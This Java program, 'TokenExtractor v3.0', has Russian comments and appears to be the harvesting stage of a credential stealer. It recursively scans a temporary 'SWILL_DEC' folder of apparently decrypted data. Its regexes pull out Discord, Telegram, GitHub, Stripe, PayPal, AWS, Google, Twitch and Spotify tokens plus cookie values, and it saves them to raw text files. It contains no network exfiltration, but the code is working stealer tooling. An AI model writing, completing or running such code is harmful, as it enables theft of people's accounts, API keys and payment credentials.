import java.io.*;
import java.nio.file.*;
import java.util.regex.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class TokenExtractor {
    private static final String DEC_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = DEC_DIR + "\\extracted";
    
    // Полный список паттернов для токенов
    private static final String[] TOKEN_PATTERNS = {
        // Discord (основной)
        "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
        "mfa\\.[\\w-]{84}",
        // Discord OAuth2
        "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}_[\\w-]{6}",
        // JWT токены
        "eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{20,}\\.[a-zA-Z0-9_-]{20,}",
        // Telegram бот токены
        "\\d{8,10}:[A-Za-z0-9_-]{35}",
        // GitHub токены
        "gh[opu]_[A-Za-z0-9]{36}",
        // Stripe
        "sk_live_[A-Za-z0-9]{24}",
        "rk_live_[A-Za-z0-9]{24}",
        // PayPal
        "access_token\\$[A-Za-z0-9]{32}\\$[A-Za-z0-9]{32}",
        // AWS ключи
        "AKIA[0-9A-Z]{16}",
        // Google API
        "AIza[0-9A-Za-z\\-_]{35}",
        // Twitch токены
        "oauth:[a-z0-9]{30}",
        // Spotify
        "BQ[A-Za-z0-9]{50,}",
        // Steam
        "STEAM_[0-9]:[0-9]{1,10}",
        // Обычные токены доступа
        "token[=:\\s][A-Za-z0-9_\\-]{20,}",
        "access_token[=:\\s][A-Za-z0-9_\\-]{20,}",
        "auth[=:\\s][A-Za-z0-9_\\-]{20,}",
        "bearer[\\s][A-Za-z0-9_\\-]{20,}"
    };
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Extractor][" + timestamp + "] " + msg);
    }
    
    public static void main(String[] args) {
        log("TokenExtractor v3.0 started");
        new File(OUTPUT_DIR).mkdirs();
        log("Output dir: " + OUTPUT_DIR);
        
        extractAll();
        
        log("TokenExtractor finished");
    }
    
    private static void extractAll() {
        StringBuilder allTokens = new StringBuilder();
        StringBuilder allCookies = new StringBuilder();
        int totalTokenCount = 0;
        int totalCookieCount = 0;
        
        File decFolder = new File(DEC_DIR);
        if (!decFolder.exists()) {
            log("Directory not found: " + DEC_DIR);
            return;
        }
        
        // Обрабатываем ВСЕ файлы в папке и подпапках
        java.util.List<File> allFiles = new java.util.ArrayList<>();
        collectFiles(decFolder, allFiles);
        
        if (allFiles.isEmpty()) {
            log("No files found in " + DEC_DIR);
            return;
        }
        
        log("Processing " + allFiles.size() + " file(s)");
        
        for (File f : allFiles) {
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                if (content.length() < 50) continue;
                
                log("Scanning: " + f.getName() + " (" + content.length() + " bytes)");
                
                // Поиск токенов
                for (String patternStr : TOKEN_PATTERNS) {
                    Pattern p = Pattern.compile(patternStr, Pattern.CASE_INSENSITIVE);
                    Matcher m = p.matcher(content);
                    while (m.find()) {
                        String token = m.group();
                        // Фильтр мусора
                        if (isValidToken(token)) {
                            allTokens.append("[").append(f.getName()).append("] ").append(token).append("\n");
                            totalTokenCount++;
                            log("TOKEN FOUND: " + token.substring(0, Math.min(40, token.length())) + "...");
                        }
                    }
                }
                
                // Поиск куки (расширенный)
                Pattern cookieP = Pattern.compile("([_a-zA-Z0-9]{3,64})=([a-zA-Z0-9_\\-]{10,256})");
                Matcher cookieM = cookieP.matcher(content);
                while (cookieM.find()) {
                    String key = cookieM.group(1);
                    String value = cookieM.group(2);
                    if (isValidCookie(key, value)) {
                        allCookies.append("[").append(f.getName()).append("] ").append(key).append("=").append(value).append("\n");
                        totalCookieCount++;
                    }
                }
                
            } catch (Exception e) {
                log("Error processing " + f.getName() + ": " + e.getMessage());
            }
        }
        
        log("=== RESULTS ===");
        log("Tokens found: " + totalTokenCount);
        log("Cookies found: " + totalCookieCount);
        
        try {
            if (totalTokenCount > 0) {
                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), allTokens.toString().getBytes());
                log("Tokens saved to: " + OUTPUT_DIR + "\\tokens_raw.txt");
            } else {
                log("No tokens found - generating debug file");
                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_debug.txt"), "No tokens found. Here are first 1000 chars from first file:\n".getBytes());
                if (!allFiles.isEmpty()) {
                    String sample = new String(Files.readAllBytes(allFiles.get(0).toPath()));
                    Files.write(Paths.get(OUTPUT_DIR + "\\tokens_debug.txt"), sample.substring(0, Math.min(1000, sample.length())).getBytes(), StandardOpenOption.APPEND);
                }
            }
            
            if (totalCookieCount > 0) {
                Files.write(Paths.get(OUTPUT_DIR + "\\cookies_raw.txt"), allCookies.toString().getBytes());
                log("Cookies saved to: " + OUTPUT_DIR + "\\cookies_raw.txt");
            }
        } catch (Exception e) {
            log("Error saving: " + e.getMessage());
        }
    }
    
    private static void collectFiles(File dir, java.util.List<File> list) {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                collectFiles(f, list);
            } else {
                list.add(f);
            }
        }
    }
    
    private static boolean isValidToken(String token) {
        if (token == null) return false;
        if (token.length() < 20) return false;
        if (token.contains("{")) return false;
        if (token.contains("<")) return false;
        if (token.contains("null")) return false;
        if (token.contains("undefined")) return false;
        return true;
    }
    
    private static boolean isValidCookie(String key, String value) {
        if (key == null || value == null) return false;
        if (value.length() < 10) return false;
        if (value.contains("null")) return false;
        if (value.contains("undefined")) return false;
        if (key.equals("_ga") && value.length() < 20) return false;
        return true;
    }
}
